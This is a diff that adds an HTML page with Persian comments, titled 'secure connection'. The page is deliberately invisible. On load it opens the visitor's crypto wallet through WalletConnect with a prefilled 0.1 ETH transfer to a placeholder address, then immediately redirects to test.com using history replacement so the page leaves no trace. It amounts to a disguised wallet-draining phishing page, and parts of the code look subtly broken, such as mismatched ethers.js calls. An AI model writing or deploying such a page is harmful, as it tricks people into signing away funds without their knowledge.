@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <title>اتصال ایمن</title> <!-- عنوان برای سئو، اما visible نیست -->
+  <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script> <!-- ethers.js برای تراکنش -->
+  <script src="https://unpkg.com/@walletconnect/web3-provider@2.0.0/dist/umd/index.min.js"></script> <!-- WalletConnect -->
+</head>
+<body>
+  <!-- هیچ محتوای visible نداریم—صفحه کاملاً نامرئیه -->
+  <script>
+    // کد برای لینک مستقیم: همزمان کیف پول فرامی‌خونه و به test.com ریدایرکت می‌کنه
+    async function createDeepLinkAndOpenSite() {
+      // ایجاد provider WalletConnect (مثل Aave)
+      const provider = new WalletConnectProvider({
+        infuraId: 'c886ed6dee284317ad1e17cb5e5cba6f', // کلید Infura از infura.io (رایگان)
+        chainId: 1, // اتریوم اصلی (برای تست: 11155111 برای Sepolia)
+      });
+
+      try {
+        // فعال کردن اتصال (دیپ لینک: کیف پول فوری باز می‌شه)
+        await provider.enable();
+
+        // تراکنش از پیش آماده: مثلاً انتقال 0.1 ETH (تغییر بده)
+        const signer = new ethers.Wallet(provider);
+        const tx = {
+          to: '0xRecipientAddressHere', // آدرس گیرنده
+          value: ethers.parseEther('0.1'), // مبلغ
+          gasLimit: 21000,
+        };
+
+        // پیشنهاد تراکنش
+        await provider.request({ method: 'eth_sendTransaction', params: [tx] });
+        console.log('تراکنش امضا شد'); // فقط در کنسول
+      } catch (error) {
+        console.error('خطا: ', error); // فقط در کنسول، بدون alert
+      }
+    }
+
+    // همزمان: ریدایرکت فوری به وبسایت توضیحات و فراخوانی کیف پول
+    (function() {
+      // باز کردن کیف پول (غیرهمزمان برای سرعت)
+      createDeepLinkAndOpenSite();
+      // ریدایرکت فوری به test.com (صفحه GitHub Pages باقی نمی‌مونه)
+      window.location.replace('https://test.com'); // replace تاریخچه مرورگر رو پاک می‌کنه
+    })();
+
+    // برای تست: اگر ?auto=false باشه، اجرا نشه
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('auto') === 'false') {
+      window.onload = null; // غیرفعال کردن
+    }
+  </script>
+</body>
+</html>
